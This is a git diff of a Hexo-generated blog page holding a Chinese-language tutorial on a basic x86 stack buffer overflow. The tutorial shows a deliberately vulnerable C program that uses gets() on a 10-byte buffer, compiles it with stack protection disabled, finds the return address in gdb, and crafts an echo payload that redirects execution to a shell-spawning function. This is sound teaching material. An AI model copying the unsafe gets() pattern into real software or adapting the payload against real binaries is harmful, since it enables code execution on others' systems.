@@ -5,17 +5,17 @@
   
   <title>[Security] Buffer Overflow | Jeno&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#前言Buffer Overflow是最基礎也是最常見的漏洞攻擊，以下是在x86執行的實作範例。">
+  <meta name="description" content="前言Buffer Overflow是最基礎也是最常見的漏洞攻擊，以下是在x86執行的實作範例。">
 <meta name="keywords" content="Security,C">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Security] Buffer Overflow">
 <meta property="og:url" content="http://jeno5980515.github.io/2015/12/11/Security/Buffer Overflow/index.html">
 <meta property="og:site_name" content="Jeno's Blog">
-<meta property="og:description" content="#前言Buffer Overflow是最基礎也是最常見的漏洞攻擊，以下是在x86執行的實作範例。">
-<meta property="og:updated_time" content="2017-04-08T02:39:38.000Z">
+<meta property="og:description" content="前言Buffer Overflow是最基礎也是最常見的漏洞攻擊，以下是在x86執行的實作範例。">
+<meta property="og:updated_time" content="2017-04-14T13:30:22.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Security] Buffer Overflow">
-<meta name="twitter:description" content="#前言Buffer Overflow是最基礎也是最常見的漏洞攻擊，以下是在x86執行的實作範例。">
+<meta name="twitter:description" content="前言Buffer Overflow是最基礎也是最常見的漏洞攻擊，以下是在x86執行的實作範例。">
   
     <link rel="alternative" href="/atom.xml" title="Jeno&#39;s Blog" type="application/atom+xml">
   
@@ -101,13 +101,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#前言<br><code>Buffer Overflow</code>是最基礎也是最常見的漏洞攻擊，以下是在<code>x86</code>執行的實作範例。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Buffer Overflow</code>是最基礎也是最常見的漏洞攻擊，以下是在<code>x86</code>執行的實作範例。</p>
 <a id="more"></a>
-<p>#程式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</div><div class="line">	system(<span class="string">"/bin/sh"</span>) ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>] ;</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"What's your name?"</span>) ;</div><div class="line">	gets(buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Hi !! %s\n"</span>,buf) ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	exec();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="程式"><a href="#程式" class="headerlink" title="程式"></a>程式</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</div><div class="line">	system(<span class="string">"/bin/sh"</span>) ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>] ;</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"What's your name?"</span>) ;</div><div class="line">	gets(buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Hi !! %s\n"</span>,buf) ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	exec();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>這是一支簡單的讀入輸出的程式碼，但注意到由於<code>buf</code>只有10個byte的空間，所以一旦輸入大於10個byte的字串就有可能造成意外。</p>
-<p>#Stack Smashing<br>普遍編譯器都會提供<code>Stack Smashing</code>的保護，但為了簡單示範在編譯時將保護關掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -c -fno-stack-protector test.c</div><div class="line">gcc -o test test.o</div></pre></td></tr></table></figure></p>
-<p>#攻擊<br>假設程式碼中剛剛好有你想執行的函式，如此一來我們只要取得函式的位置後利用overflow蓋過去欲執行的位置即可。</p>
-<p>#GDB<br>我們可以利用gdb來debugger<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb ./test</div></pre></td></tr></table></figure></p>
+<h1 id="Stack-Smashing"><a href="#Stack-Smashing" class="headerlink" title="Stack Smashing"></a>Stack Smashing</h1><p>普遍編譯器都會提供<code>Stack Smashing</code>的保護，但為了簡單示範在編譯時將保護關掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -c -fno-stack-protector test.c</div><div class="line">gcc -o test test.o</div></pre></td></tr></table></figure></p>
+<h1 id="攻擊"><a href="#攻擊" class="headerlink" title="攻擊"></a>攻擊</h1><p>假設程式碼中剛剛好有你想執行的函式，如此一來我們只要取得函式的位置後利用overflow蓋過去欲執行的位置即可。</p>
+<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><p>我們可以利用gdb來debugger<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb ./test</div></pre></td></tr></table></figure></p>
 <p>查看main的stack分佈<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div></pre></td></tr></table></figure></p>
 <p>得知在<code>*main+6</code>的位置執行<code>exec</code>函式，因此我們先在這邊設一個<code>Break Point</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) b *main+6</div></pre></td></tr></table></figure></p>
 <p>再來我們查看exec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas exec</div></pre></td></tr></table></figure></p>
@@ -120,12 +120,12 @@
 <p>得到位置為<code>0x44444444</code>，也就是<code>DDDD</code>的部分，因此我們需要在DDDD的部分放進想執行的位置，現在來查看欲執行的函式位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas *exec</div></pre></td></tr></table></figure></p>
 <p>得到位置為<code>0x080484ad</code>，因此可以得到我們的攻擊字串，由於是<code>little endian</code>所以記得將位置相反。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -ne &quot;xxxxxxxxxxAAAABBBBCCCC\xad\x84\x04\x08\n&quot; &gt; s</div></pre></td></tr></table></figure></p>
 <p>再將字串丟進程式運行則可以發現執行到覆蓋的部分了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat s - | ./test</div></pre></td></tr></table></figure></p>
-<p>#結論<br>這只是展示最簡單的<code>Buffer Overflow</code>運行原理，不過一般情況會有許多的保護機制，也不太可能這麼剛好塞了特別的函式讓你運行，其餘的方法待之後學習紀錄。</p>
+<h1 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h1><p>這只是展示最簡單的<code>Buffer Overflow</code>運行原理，不過一般情況會有許多的保護機制，也不太可能這麼剛好塞了特別的函式讓你運行，其餘的方法待之後學習紀錄。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://jeno5980515.github.io/2015/12/11/Security/Buffer Overflow/" data-id="cj1hupfeb00026b3hvrilnenn" class="article-share-link">Share</a>
+      <a data-url="http://jeno5980515.github.io/2015/12/11/Security/Buffer Overflow/" data-id="cj1hwegbg0003b93hljpovth2" class="article-share-link">Share</a>
       
         <a href="http://jeno5980515.github.io/2015/12/11/Security/Buffer Overflow/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -184,7 +184,7 @@
       <ul class="recent">
         
           <li>
-            <a href="/2017/04/13/Web/Overall/a/">[Web] AMD及效能調校</a>
+            <a href="/2017/04/13/Web/Overall/AMD及效能調校/">[Web] AMD及效能調校</a>
           </li>
         
           <li>
@@ -251,7 +251,7 @@
 		  <a href="https://github.com/jeno5980515" target="_blank" title="github" ><span class="icon-github"></span></a>
 		  <a href="https://www.facebook.com/profile.php?id=100000234360427" target="_blank" title="facebook" ><span class="icon-facebook"></span></a>
 		  <a href="http://uhunt.felix-halim.net/id/437494" target="_blank" title="uhunt" ><span class="icon-uhunt"></span></a>
-		  <a href="tw.linkedin.com/in/jeno5980515" target="_blank" title="linkedin" ><span class="icon-linkedin"></span></a>
+		  <a href="http://tw.linkedin.com/in/jeno5980515" target="_blank" title="linkedin" ><span class="icon-linkedin"></span></a>
 	  </div>
 	  <div id="footer-info" class="inner">
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and Theme by 
